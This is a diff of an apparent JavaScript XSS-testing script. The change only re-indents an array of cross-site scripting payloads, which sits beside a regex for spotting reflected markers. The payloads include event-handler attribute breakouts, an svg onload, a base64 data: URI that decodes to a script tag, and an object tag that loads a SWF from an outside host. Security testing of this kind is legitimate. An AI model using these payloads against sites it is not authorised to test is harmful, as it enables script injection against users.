@@ -13,20 +13,20 @@ var bFillHiddenForms = 0
 var iPayload = 0
 
 var aPayloads = ['aaa"bbb\'ccc<ddd>eee', 
-				 'aaa"bbb\'eee', 
-				 'aaa"eee', 
-				 'aaa\\"bbb\\\'>ccc<<ddd>ddd<ddd>>eee<fff', 
-				 'aaa\\"bbb\\\'ccc<ddd >eee</fff>', 
-				 '</title></textarea>aaa"bbb\'ccc<ddd>eee', 
-				 'aaa"><svg onload=alert(document.domain)>eee', 
-				 'aaa" autofocus onfocus="alert(document.domain)"eee', 
-				 'aaa" onmouseover="alert(document.domain)"eee', 
-				 'aaa" accesskey=x onclick="alert(document.domain)"eee', 
-				 'aaa\'-alert(document.domain)-\'eee', 
-				 'aaa"-alert(document.domain)-"eee', 
-				 'aaa"><video src onratechange=prompt(document.domain)>eee', 
-				 'aaa"><object allowscriptaccess="always" data="http://spqr.zz.mu/xss.swf"></object>eee', 
-				 'aaa"><a href=data:xxx;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ+>XSS</a>eee']
+		 'aaa"bbb\'eee', 
+		 'aaa"eee', 
+		 'aaa\\"bbb\\\'>ccc<<ddd>ddd<ddd>>eee<fff', 
+		 'aaa\\"bbb\\\'ccc<ddd >eee</fff>', 
+		 '</title></textarea>aaa"bbb\'ccc<ddd>eee', 
+		 'aaa"><svg onload=alert(document.domain)>eee', 
+		 'aaa" autofocus onfocus="alert(document.domain)"eee', 
+		 'aaa" onmouseover="alert(document.domain)"eee', 
+		 'aaa" accesskey=x onclick="alert(document.domain)"eee', 
+		 'aaa\'-alert(document.domain)-\'eee', 
+		 'aaa"-alert(document.domain)-"eee', 
+		 'aaa"><video src onratechange=prompt(document.domain)>eee', 
+		 'aaa"><object allowscriptaccess="always" data="http://spqr.zz.mu/xss.swf"></object>eee', 
+		 'aaa"><a href=data:xxx;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ+>XSS</a>eee']
 
 var regex = /.{0,100}aaa.{0,100}?eee.{0,100}/gi
 
